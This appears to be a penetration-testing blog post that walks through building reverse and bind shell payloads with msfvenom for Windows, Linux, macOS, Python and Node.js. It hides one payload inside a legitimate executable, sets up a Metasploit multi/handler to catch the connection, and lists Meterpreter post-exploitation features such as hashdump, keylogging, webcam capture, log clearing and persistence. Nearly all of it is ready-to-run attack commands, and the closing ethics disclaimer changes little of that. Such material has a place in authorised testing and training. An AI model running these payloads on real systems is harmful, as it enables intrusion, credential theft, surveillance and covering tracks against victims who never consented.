---
title: MSFVenom Reverse Shells + Handler
publishedOn: Febuary 14th, 2023
slug: msfvenom-reverse-shells
excerpt: This blog article explores the use of Msfvenom and Metasploit for creating and controlling reverse shells, which are a type of shell that provides a remote command line interface to a compromised system. The article explains how Msfvenom can be used to generate a reverse shell payload, and how Metasploit's multi/handler module can be used to handle the incoming connection from the compromised system.
readingTime: 10 mins
---
# Metasploit-Framework's Msfconsole && Msfvenom

Msfvenom and Metasploit are popular tools in the field of penetration testing and exploitation. Msfvenom is a versatile payload generator that can be used to create various types of payloads, including reverse shells. A reverse shell is a type of shell in which a remote system connects back to the attacker's system, providing the attacker with a command line interface to execute commands on the remote system. Metasploit, on the other hand, is a framework that provides a set of tools for exploiting vulnerabilities in systems.


# **Creating The Shell with Msfvenom**
------------------------
To use Msfvenom to create a reverse shell, the attacker needs to specify the payload type, the target platform, the IP address and port to connect back to, and any additional options as needed. Once the payload is generated, it can be delivered to the target system using various methods, such as social engineering, phishing, arp poisoning or exploiting vulnerabilities. In most cases it also needs to be be exectud

--------------------

## **Msfvenom uses the following syntax....**
    msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP> LPORT=<PORT>

**List Payloads**

`msfvenom -l payloads`

**List Encoders**

`msfvenom -l encoders` 


### **Windows Reverse Shell....**
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe`

### **Windows Bing Shell...**
`msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe`

Embedded inside an executable...
`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe`

### **Linux Reverse Shells...**
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf`

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf`

### **Linux Bind Shell...**
`msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf`

### **Mac Reverse Shell...**
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho`

### **Mac Bind Shell...**
`msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho`

### **Python Shell....**
`msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py`

### **Node.Js Shell...**
`msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)`

--------------------

Some recources make it so you don't ever have to know any of this. In the Chrome Web Store, [Hack-Tools](https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi) has an awesome feature that will build these commands for you in a GUI, both for client/handler commands.

--------------------

Another great one is [revshells.com](https://www.revshells.com/)
------------------------

# Handling The Shell with Msfconsole
To handle the incoming connection from the target system, Metasploit provides a module called "multi/handler". This module listens on a specified IP address and port and provides a command line interface to interact with the remote system. When the remote system connects back to the handler, the attacker can use various Metasploit modules to gain further access to the system.

Start Metasploit...
`msfconsole -q`

We need to select multi/handler module...
`use multi/handler`

Setting the payload to whatever payload you choose earlier...
`set payload windows/x64/meterpreter/reverse_tcp`

Configuring the Connection Details...
`set lhost 10.112.11.229; set lport 1111;`

Starting up the listener...

`run` or `exploit`

It's now listening on that port for the reverse connection, so as soon as the payload executes on the target your session will start.

---------------
# **Meterpreter Shells**

One of the most popular modules in Metasploit is called "meterpreter". Meterpreter is a powerful post-exploitation tool that provides a rich set of features, including file system access, privilege escalation, keylogging, and more. Meterpreter is designed to bypass traditional security measures, such as firewalls and antivirus software, and provides a stealthy and persistent way to maintain control over the compromised system.

Besides reverse shells and meterpreter, other types of shells include bind shells, which listen for incoming connections from the attacker, and web shells, which are scripts or programs that are uploaded to a vulnerable web application to provide a command line interface. Each type of shell has its own advantages and disadvantages, and the choice of which to use depends on the specific scenario and the attacker's goals.

------------
# A few awesome Meterpreter Abilities

 - getsystem - Attempts to elevate privileges on the compromised system to the highest level possible.
- hashdump - Dumps the password hashes stored on the compromised system, which can be used for further exploitation.
- clearev - Clears the event logs on the compromised system to cover the attacker's tracks.
- screenshot - Takes a screenshot of the compromised system's desktop.
- keyscan_start/keyscan_stop - Starts or stops keylogging on the compromised system to capture keystrokes, including passwords.
- webcam_snap - Takes a snapshot from the compromised system's webcam.
- persistence - Installs a persistent backdoor on the compromised system, allowing the attacker to maintain access even after reboot.
- migrate - Moves the Meterpreter process to a new process on the compromised system, which can help evade detection by security software.
- shell - Opens a shell on the compromised system, allowing the attacker to execute commands directly.
- upload/download - Uploads or downloads files to/from the compromised system.
- portfwd - Forwards a port from the compromised system to the attacker's system, allowing the attacker to access services on the compromised system that are not exposed externally.
- socks4a - Sets up a SOCKS4a proxy on the compromised system, allowing the attacker to pivot through the compromised system to access other internal systems.
------------------------


## **Safe to say, Try and use a Meterpreter shell when it's available**
------------------------

#### ***While the use of reverse shells and post-exploitation tools like Meterpreter can be powerful tools for penetration testing and security research, it's important to always use this knowledge for good and never cause harm or be intrusive to others. As ethical hackers, we have a responsibility to use our skills and knowledge in a responsible and ethical way to improve the security of systems and protect the privacy of individuals and organizations. Let's always remember to use our powers for good and to promote a safer and more secure digital world.*** 